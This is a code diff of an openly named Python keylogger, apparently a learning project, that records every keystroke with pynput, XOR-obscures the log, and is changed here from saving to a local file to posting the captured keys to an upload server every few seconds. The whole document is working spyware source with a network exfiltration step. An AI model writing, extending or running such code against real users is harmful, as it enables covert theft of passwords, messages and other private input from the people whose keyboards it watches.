@@ -1,11 +1,9 @@
-import threading
 from pynput import keyboard
 from datetime import datetime
-import json
-import os
 from flask import jsonify
+import requests
 import time
-
+import platform
 
 
 class IKeylogger:
@@ -29,7 +27,6 @@ class IKeylogger:
                 tempKey = str(key)
         self.my_list.append(tempKey)
 
-
     def start_logging(self):
         self.listener = keyboard.Listener(on_press=self.on_press)
         self.listener.start()
@@ -43,58 +40,45 @@ class IKeylogger:
         return keys
 
 
-
-class AddToFile():
+class AddToFile:
     def __init__(self):
         self.timestamps = []
 
-    def create_file(self, combined_keys):
+    def create_file(self,combined_keys):
         if not combined_keys:
-            return
-
-        filename = os.getlogin() + ".json"
+            return None
         timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-        entry = {timestamp: combined_keys}
-
-        if os.path.exists(filename):
-            with open(filename, "r") as f:
-                try:
-                    data = json.load(f)
-                except json.JSONDecodeError:
-                    data = {}
-        else:
-            # אם אין קובץ – ניצור אותו ריק
-            data = {}
-            with open(filename, "w") as f:
-                json.dump(data, f)
-
-        data.update(entry)
-
-        with open(filename, "w") as f:
-            json.dump(data, f)
+        data = {"machine":"abcd","logs":{timestamp:combined_keys}}
+        return data
 
 
     def xor_encrypt(self, text, key):
         return ''.join(f"{ord(c) ^ ord(key[i % len(key)]):02x}"
                        for i, c in enumerate(text))
 
+
+class NetworkWriter:
+    def sendung(self,data):
+        url = "http://127.0.0.1:5000/upload"
+        requests.post(url,json=data)
+
+
 class Manager:
     def __init__(self):
         self.keylogger = IKeylogger()
         self.add = AddToFile()
+        self.send = NetworkWriter()
 
     def run(self):
         self.keylogger.start_logging()
         while True:
-            time.sleep(3)
+            time.sleep(5)
             keys = self.keylogger.get_logged_keys()
             data = self.add.xor_encrypt(keys,"01234567891")
-            self.add.create_file(data)
-            print(data)
-            if keys == "Key.ctrl_l": # ctrl+c עוצר את התוכנה אחרי שהוקלד
+            self.send.sendung(self.add.create_file(data))
+            if keys == "Key.ctrl_l":
                 self.keylogger.stop_logging()
                 break
-
 
 
 
